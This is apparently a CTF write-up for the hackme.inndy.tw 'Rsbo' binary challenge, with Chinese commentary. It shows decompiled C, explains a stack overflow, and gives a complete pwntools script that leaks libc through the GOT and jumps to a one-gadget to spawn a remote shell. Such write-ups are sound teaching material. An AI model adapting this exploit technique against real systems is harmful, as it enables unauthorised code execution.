---
title: hackme.inndy.tw::Rsbo & Rsbo 2
date: 2021-10-17 21:24:55
tags: 
    - pwn
    - write ups
---

## challenge
`Tips: ROP, open, read`

## 保護機制
NX開啟，Partial RELRO

## 分析
### main
<!-- more -->
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v3; // eax
  char buf[80]; // [esp+10h] [ebp-60h]
  int v6; // [esp+60h] [ebp-10h]
  int v7; // [esp+64h] [ebp-Ch]
  int v8; // [esp+68h] [ebp-8h]
  int i; // [esp+6Ch] [ebp-4h]

  alarm(0x1Eu);
  init();
  v8 = read_80_bytes(buf);
  for ( i = 0; i < v8; ++i )
  {
    v3 = rand();
    v7 = v3 % (i + 1);
    v6 = buf[i];
    buf[i] = buf[v3 % (i + 1)];
    buf[v7] = v6;
  }
  write(1, buf, v8);
  return 0;
}
```
### init
```c
void init()
{
  char buf[16]; // [esp+14h] [ebp-24h]
  int fd; // [esp+24h] [ebp-14h]
  unsigned int seed; // [esp+28h] [ebp-10h]
  int i; // [esp+2Ch] [ebp-Ch]

  fd = open("/home/ctf/flag", 0);
  read(fd, buf, 0x10u);
  seed = time(0);
  for ( i = 0; i <= 15; ++i )
    seed = (signed int)(1337 * seed + buf[i]) % 0x7FFFFFFF;
  close(fd);
  memset(buf, 0, 0x10u);
  srand(seed);
}
```
觀察組語可發現 `main()` stack大小小於0x80(128), 而`read_80_bytes()`造成 overflow

因為ASLR, NX 的關係, 需要想辦法ROP

但binary太小, 組不起ROP chain, 因此使用libc

只要Leak GOT, 接著就可以算出libc base & getshell了

## exploit
```python
#!/usr/bin/env python2

from pwn import *
context.log_level = 'debug'

#p = process('rsbo')
p = remote('hackme.inndy.tw', 7706)
e = ELF('rsbo')
libc = ELF('libc-2.23.so.i386')

#Stage 1 (leak read)
payload = '\x00'*108
payload += p32(e.symbols['write']) + p32(e.symbols['_start']) + p32(1) + p32(e.got['read']) + p32(4)
p.send(payload)
libc_base = u32(p.recv(4)) - libc.symbols['read']
print '[+]Libc base at: {}'.format(hex(libc_base))

payload = '\x00'*108
payload += p32(libc_base + 0x5faa5)
p.send(payload)

p.interactive()
p.close()
```
shell連上去之後可以拿到2個 Flag

